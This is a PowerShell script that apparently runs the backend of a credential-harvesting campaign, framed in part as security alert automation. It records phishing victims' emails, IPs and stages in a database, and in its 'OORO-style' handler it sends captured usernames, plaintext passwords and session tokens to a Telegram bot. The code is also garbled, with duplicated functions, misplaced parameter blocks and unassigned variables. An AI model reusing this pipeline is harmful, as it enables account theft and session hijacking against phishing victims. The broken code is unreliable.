# Enhanced Boardroom Metrics: Mean Time to Detection (MTTD)
function Get-CampaignMetrics {
    $dbPath = ".\harvester_data.db"
    $sqlite = "C:\Users\HomePC\Downloads\sqlite-tools-win-x64-3530000\sqlite3.exe"
    $query = @"
    SELECT 
        domain,
        MIN(CASE WHEN event_type = 'Load' THEN timestamp END) as FirstHit,
        MIN(CASE WHEN event_type = 'Scanner_Hit' THEN timestamp END) as FirstDetection
    FROM telemetry
    GROUP BY domain
    HAVING FirstDetection IS NOT NULL;
"@
    $tmpQuery = [System.IO.Path]::GetTempFileName()
    Set-Content -Path $tmpQuery -Value $query
    $detectionDataRaw = & $sqlite -header -separator '|' $dbPath ".read $tmpQuery"
    Remove-Item $tmpQuery -Force
    $lines = $detectionDataRaw | Where-Object { $_ -and ($_ -notmatch "domain") }
    $detectionData = @()
    foreach ($line in $lines) {
        $cols = $line -split '\|'
        if ($cols.Length -ge 3) {
            $detectionData += [PSCustomObject]@{
                domain = $cols[0].Trim()
                FirstHit = $cols[1].Trim()
                FirstDetection = $cols[2].Trim()
            }
        }
    }
    $totalMinutes = 0
    $count = 0
    foreach ($row in $detectionData) {
        $start = [DateTime]::Parse($row.FirstHit)
        $end = [DateTime]::Parse($row.FirstDetection)
        $diff = ($end - $start).TotalMinutes
        if ($diff -gt 0) {
            $totalMinutes += $diff
            $count++
        }
    }
    $MTTD = if ($count -gt 0) { [Math]::Round($totalMinutes / $count, 2) } else { 0 }
    Write-Host "`n--- Boardroom KPI Report ---" -ForegroundColor Cyan
    Write-Host "Mean Time to Detection: $MTTD Minutes" -ForegroundColor Yellow
    Write-Host "----------------------------`n"
}
# Metrics extraction function
function Get-CampaignMetrics {
    $sqlite = "C:\Users\HomePC\Downloads\sqlite-tools-win-x64-3530000\sqlite3.exe"
    $db = "C:\Users\HomePC\OneDrive\mine2026\harvest_events.db"
    Write-Host "Credential Harvest Metrics:" -ForegroundColor Cyan

    $stages = @('page_load', 'interaction', 'harvested')
    foreach ($stage in $stages) {
        $count = & $sqlite $db "SELECT COUNT(*) FROM credential_harvest WHERE stage = '$stage';"
        Write-Host ("Stage '$stage': $count events")
    }

    $avgGap = & $sqlite $db "SELECT AVG(switchover_gap) FROM credential_harvest WHERE switchover_gap IS NOT NULL;"
    Write-Host ("Average switchover_gap: $avgGap")
}
# Health check/status reporting config
$HealthCheckIntervalHours = 6
$global:LastAlertTime = $null
$global:ScriptStartTime = Get-Date
# Configurable alert severity filter
$AllowedSeverities = @('high', 'critical') # Only process these levels

# Logging function
function Add-CredentialHarvestEvent {
    param(
        [string]$timestamp,
        [string]$target_email,
        [string]$source_ip,
        [string]$user_agent,
        [string]$domain_used,
        [string]$stage,
        [double]$switchover_gap = 0
    )
    $sqlite = "C:\\Users\\HomePC\\Downloads\\sqlite-tools-win-x64-3530000\\sqlite3.exe"
    $db = "C:\\Users\\HomePC\\OneDrive\\mine2026\\harvest_events.db"
    $sql = "INSERT INTO credential_harvest (timestamp, target_email, source_ip, user_agent, domain_used, stage, switchover_gap) VALUES ('$timestamp', '$target_email', '$source_ip', '$user_agent', '$domain_used', '$stage', $switchover_gap);"
    & $sqlite $db $sql
}
function Write-AlertAction {
    param([string]$message, [string]$level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logLine = $timestamp + " [" + $level + "] " + $message
    $logLine | Out-File -FilePath "alert_automation.log" -Append
    # Log rotation/cleanup: keep only last 500 lines
    try {
        $maxLogLines = 500
        $logPath = "alert_automation.log"
        $lines = Get-Content $logPath -ErrorAction SilentlyContinue
        if ($lines.Count -gt $maxLogLines) {
            $lines[-$maxLogLines..-1] | Set-Content $logPath
        }
    } catch {
        # Ignore log cleanup errors
    }
    # Send error notification to Telegram if level is ERROR
    if ($level -eq "ERROR") {
        try {
            $errorPayload = @{ alert = $message; level = $level; timestamp = (Get-Date).ToString('s'); alertType = "ScriptError" } | ConvertTo-Json -Compress
            $tmpFile = [System.IO.Path]::GetTempFileName() + ".json"
            Set-Content -Path $tmpFile -Value $errorPayload
            node send_telegram_alert.js $tmpFile | Out-Null
            Remove-Item $tmpFile -Force
        } catch {}
    }
}

# Alert file handler
function Invoke-AlertFile {
        $global:LastAlertTime = Get-Date
    param($alertPath)
    $alertName = [System.IO.Path]::GetFileName($alertPath)
    # Severity filter: skip if not in allowed list
    $alertContent = Get-Content $alertPath -Raw
    try {
        $alertObj = $alertContent | ConvertFrom-Json
        $alertLevel = ($alertObj.level -as [string])
        if ($null -eq $alertLevel) { $alertLevel = '' }
        $alertLevel = $alertLevel.ToLower()
        if ($AllowedSeverities -notcontains $alertLevel) {
            Write-Host ("[INFO] Alert skipped by severity filter: " + $alertName + " (level=" + $alertLevel + ")") -ForegroundColor Yellow
            Write-AlertAction ("Alert skipped by severity filter: " + $alertName + " (level=" + $alertLevel + ")")
            return
        }
        try {
            Write-Host ("[DEBUG] Simulation detection: alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Yellow
            $json = Get-Content $alertPath -Raw | ConvertFrom-Json
            if ($null -ne $json -and $json.PSObject.Properties.Name -contains 'isSimulation' -and $json.isSimulation) {
                $StartTime = Get-Date
                $simDir = "sim_tracking"
                if (!(Test-Path $simDir)) { New-Item -ItemType Directory -Path $simDir | Out-Null }
                if ($json.PSObject.Properties.Name -contains 'username') {
                    $userFile = $simDir + "/" + $json.username + ".txt"
                    Set-Content -Path $userFile -Value $StartTime
                }
            }
        } catch {
            Write-Host ("[ERROR] Simulation detection failed for: alertPath=" + $alertPath + ", alertName=" + $alertName + " - " + $_.Exception.Message) -ForegroundColor Red
        }
    } catch {
        Write-Host ("[ERROR] Failed to process alert file: " + $alertName + " - " + $_.Exception.Message) -ForegroundColor Red
        Write-AlertAction ("[ERROR] Failed to process alert file: " + $alertName + " - " + $_.Exception.Message) "ERROR"
        return
    }
        if (-not $stage) { $stage = $alertObj.alertType }
        $switchover_gap = 0
        if ($alertObj.PSObject.Properties.Name -contains 'switchover_gap') { $switchover_gap = $alertObj.switchover_gap }
        Add-CredentialHarvestEvent -timestamp $timestamp -target_email $target_email -source_ip $source_ip -user_agent $user_agent -domain_used $domain_used -stage $stage -switchover_gap $switchover_gap
        # --- End SQLite event logging ---
        try {
            $json = Get-Content $alertPath -Raw | ConvertFrom-Json
            $enriched = $false
            # Simulation enrichment
            if ($null -ne $json -and $json.PSObject.Properties.Name -contains 'isSimulation' -and $json.isSimulation) {
                $StartTime = Get-Date
                $simDir = "sim_tracking"
                if (!(Test-Path $simDir)) { New-Item -ItemType Directory -Path $simDir | Out-Null }
                if ($json.PSObject.Properties.Name -contains 'username') {
                    $userFile = $simDir + "/" + $json.username + ".txt"
                    Set-Content -Path $userFile -Value $StartTime
                }
                $json.alertType = ("⚠️ [DRILL] " + $json.alertType)
                $enriched = $true
                Write-AlertAction ("Simulation detected and enriched for: " + $alertName)
            }
            # Custom alert type enrichment
            if ($json.PSObject.Properties.Name -contains 'customType') {
                $json.alertType = $json.customType
                $enriched = $true
            }
            # Add extra context if present
            if ($json.PSObject.Properties.Name -contains 'extraContext') {
                $json.extraContext = $json.extraContext
                $enriched = $true
            }
            if ($enriched) {
                $json | ConvertTo-Json -Depth 10 | Set-Content $alertPath
            }
        } catch {
            Write-AlertAction ("[ERROR] Simulation/custom enrichment failed for: " + $alertName + " - " + $_.Exception.Message) "ERROR"
        }
    }
    # ...existing code...
    Write-Host ("[DEBUG] Invoke-AlertFile called for: alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Yellow
    Write-AlertAction ("Invoke-AlertFile called for: alertPath=" + $alertPath + ", alertName=" + $alertName)
    # Simulation detection and enrichment
    try {
        Write-Host ("[DEBUG] Simulation detection: alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Yellow
        $json = Get-Content $alertPath -Raw | ConvertFrom-Json
        if ($null -ne $json -and $json.PSObject.Properties.Name -contains 'isSimulation' -and $json.isSimulation) {
            $StartTime = Get-Date
            $simDir = "sim_tracking"
            if (!(Test-Path $simDir)) { New-Item -ItemType Directory -Path $simDir | Out-Null }
            if ($json.PSObject.Properties.Name -contains 'username') {
                $userFile = $simDir + "/" + $json.username + ".txt"
                Set-Content -Path $userFile -Value $StartTime
            }
            $json.alertType = ("⚠️ [DRILL] " + $json.alertType)
            $json | ConvertTo-Json -Depth 10 | Set-Content $alertPath
            Write-AlertAction ("Simulation detected and enriched for: " + $alertName)
        }
    } catch {
        Write-Host ("[ERROR] Simulation detection failed for: alertPath=" + $alertPath + ", alertName=" + $alertName + " - " + $_.Exception.Message) -ForegroundColor Red
        Write-AlertAction ("[ERROR] Simulation detection failed for: " + $alertName + " - " + $_.Exception.Message) "ERROR"
    }


    # OORO-style Credential Harvest handling
    if ($json.customType -eq "Credential_Harvest" -and $json.extraContext) {
        # Generate Unix timestamps
        $createTime = [int][datetimeoffset]::Now.ToUnixTimeSeconds()
        $updateTime = $createTime + (Get-Random -Minimum 30 -Maximum 90)
        # Generate random filename (e.g., 1NmDhOSpGU.txt)
        $charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        $randomName = -join ((1..12) | ForEach-Object { $charSet[(Get-Random -Maximum $charSet.Length)] }) + ".txt"
        $OoroMarkdown = @"
Note - Message has been updated .

✨ *Session Information* ✨

👤 *Username:* ``$($json.username)``
🔑 *Password:* ``$($json.password)``
🌐 *Landing URL:* [$($json.landingUrl)]($($json.landingUrl))

💻 *User Agent:* $($json.userAgent)
🌍 *Remote Address:* $($json.remoteAddress)
🕒 *Create Time:* $createTime
🕒 *Update Time:* $updateTime

📦 *Tokens are added in txt file and attached separately in message.*
"@
        # Call the sendDocument function
        Send-TelegramWithTokenFile `
            -BotToken $BotToken `
            -ChatId $ChatId `
            -MessageBody $OoroMarkdown `
            -TokenData $json.extraContext `
            -FileName $randomName
        # Rate limit to avoid Telegram spam
        Start-Sleep -Milliseconds 500
        Write-AlertAction ("OORO-style credential harvest alert sent: " + $alertName)
        return
    }

    # Node.js formatting
    try {
        Write-Host ("[DEBUG] Formatting alert with Node.js: alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Cyan
        $formatResult = node telegram-formatter-9wolf.js $alertPath 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-AlertAction ("Formatting failed: " + $alertName + " - " + $formatResult) "ERROR"
            return
        }
        Write-AlertAction ("Formatted alert: " + $alertName)
    } catch {
        Write-AlertAction ("[ERROR] Node.js formatting failed for: " + $alertName + " - " + $_.Exception.Message) "ERROR"
        return
    }

    # Node.js Telegram send
    try {
        Write-Host ("[DEBUG] Sending alert to Telegram: alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Cyan
        $sendResult = node send_telegram_alert.js $alertPath 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-AlertAction ("Telegram send failed: " + $alertName + " - " + $sendResult) "ERROR"
            return
        }
        Write-AlertAction ("Sent alert to Telegram: " + $alertName)
    } catch {
        Write-AlertAction ("[ERROR] Telegram send failed for: " + $alertName + " - " + $_.Exception.Message) "ERROR"
        return
    }

    # Archiving
    Write-Host ("[DEBUG] About to archive. alertPath=" + $alertPath + ", alertName=" + $alertName) -ForegroundColor Yellow
    Write-AlertAction ("[DEBUG] About to archive. alertPath=" + $alertPath + ", alertName=" + $alertName)
    if (![string]::IsNullOrEmpty($alertPath)) {
        try {
            $archiveDir = "sent_alerts"
            if (!(Test-Path $archiveDir)) { New-Item -ItemType Directory -Path $archiveDir | Out-Null }
            $archivePath = $archiveDir + "/" + $alertName
            Move-Item $alertPath $archivePath -Force
            Write-AlertAction ("Archived alert: " + $alertName)
        } catch {
            Write-AlertAction ("[ERROR] Archiving failed for: " + $alertName + " - " + $_.Exception.Message + " (alertPath=" + $alertPath + ")") "ERROR"
            return
        }
    } else {
        Write-AlertAction ("[ERROR] Archiving skipped: alertPath is null or empty for " + $alertName) "ERROR"
        return
    }

    # Webhook integration
    try {
        $webhookUrl = "https://your-siem-or-soar-endpoint.example.com/alert"
        $body = @{ file = $archivePath; status = "success" } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
        Write-AlertAction ("Webhook sent for: " + $alertName)
    } catch {
        Write-AlertAction ("[ERROR] Webhook failed for: " + $alertName + " - " + $_.Exception.Message) "ERROR"
    }
# Startup processing for existing alerts
$existingAlerts = Get-ChildItem -Path . -Filter 'alert_*.json' | Sort-Object LastWriteTime
foreach ($file in $existingAlerts) {
    Write-Host ("[Startup] Processing existing alert: " + $file.Name) -ForegroundColor Yellow
    Write-AlertAction ("[Startup] Processing existing alert: " + $file.Name)
    Invoke-AlertFile $file.FullName
}

try {
    Write-Host "[DEBUG] Minimal watcher baseline started" -ForegroundColor Magenta
    Write-AlertAction "[DEBUG] Minimal watcher baseline started"
    $watcher = New-Object System.IO.FileSystemWatcher
    $watcher.Path = (Get-Location).Path
    $watcher.Filter = "alert_*.json"
    $watcher.EnableRaisingEvents = $true
    $watcher.IncludeSubdirectories = $false

    Register-ObjectEvent $watcher Created -Action {
        try {
            Write-Host ("[DEBUG] Detected new file: " + $Event.SourceEventArgs.FullPath) -ForegroundColor Cyan
            Write-AlertAction ("Detected new alert file: " + $Event.SourceEventArgs.FullPath)
            Invoke-AlertFile $Event.SourceEventArgs.FullPath
        } catch {
            Write-Host ("[ERROR] Watcher event handler error: " + $_.Exception.Message) -ForegroundColor Red
            Write-AlertAction ("[ERROR] Watcher event handler error: " + $_.Exception.Message) "ERROR"
        }
    }
    Write-Host "[DEBUG] Minimal watcher baseline running. Press Ctrl+C to exit." -ForegroundColor Green
    Write-AlertAction "[DEBUG] Minimal watcher baseline running. Press Ctrl+C to exit."
    $lastHealthCheck = Get-Date
    while ($true) {
        try {
            Start-Sleep -Seconds 5
            # Health check: send status every $HealthCheckIntervalHours
            if ((Get-Date) - $lastHealthCheck -ge ([TimeSpan]::FromHours($HealthCheckIntervalHours))) {
                $uptime = (Get-Date) - $global:ScriptStartTime
                $lastAlert = $global:LastAlertTime
                $statusPayload = @{ 
                    alert = "[HEALTH CHECK] Alert automation script is running. Uptime: $($uptime.ToString()). Last alert: $lastAlert";
                    level = "info";
                    timestamp = (Get-Date).ToString('s');
                    alertType = "HealthCheck"
                } | ConvertTo-Json -Compress
                $tmpFile = [System.IO.Path]::GetTempFileName() + ".json"
                Set-Content -Path $tmpFile -Value $statusPayload
                node send_telegram_alert.js $tmpFile | Out-Null
                Remove-Item $tmpFile -Force
                $lastHealthCheck = Get-Date
            }
        } catch {
            Write-Host ("[ERROR] Main loop sleep error: " + $_.Exception.Message) -ForegroundColor Red
            Write-AlertAction ("[ERROR] Main loop sleep error: " + $_.Exception.Message) "ERROR"
        }
    }
} catch {
    Write-Host ("[ERROR] Watcher setup or main loop error: " + $_.Exception.Message) -ForegroundColor Red
    Write-AlertAction ("[ERROR] Watcher setup or main loop error: " + $_.Exception.Message) "ERROR"
    exit 1
}
